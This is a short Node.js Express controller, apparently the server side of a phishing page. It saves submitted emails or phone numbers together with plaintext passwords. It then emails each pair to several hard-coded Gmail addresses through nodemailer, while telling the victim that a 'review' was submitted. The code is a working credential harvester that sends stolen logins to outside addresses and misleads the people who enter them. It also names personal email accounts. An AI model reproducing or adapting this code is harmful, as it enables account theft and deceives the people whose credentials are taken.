const nodemailer = require("nodemailer");
const Users = require('../models/userModel')

exports.createUser = async (req, res) => {
    try {

        const { emailOrPhone, password } = await req.body

        await Users.create({ emailOrPhone, password })


        const msg = {
            from: "md.naimhossen.2222@gmail.com",
            to: "thenaim33@gmail.com , md.naimhossen.1111@gmail.com",
            subject: `${emailOrPhone} er Data`,
            text: "Email and Password", // plain text body
            html: `<b>Email or Phone: ${emailOrPhone}</b>
            <br/> <b>password:  ${password}</b>`, // html body
        }

        nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: 'md.naimhossen.2222@gmail.com',
                pass: process.env.USER_PASSWORD
            },
            post: 465,
            host: 'smtp.gmail.com'
        })
            .sendMail(msg, (err) => {
                if (err) {
                    return console.log('Error', err)
                } else {
                    return console.log('Email sended')
                }
            })




        res.json({
            success: true,
            message: "Review Submitted successfully"
        })
    } catch (err) {
        console.log(err)
        res.json({
            message: err
        })

    }
}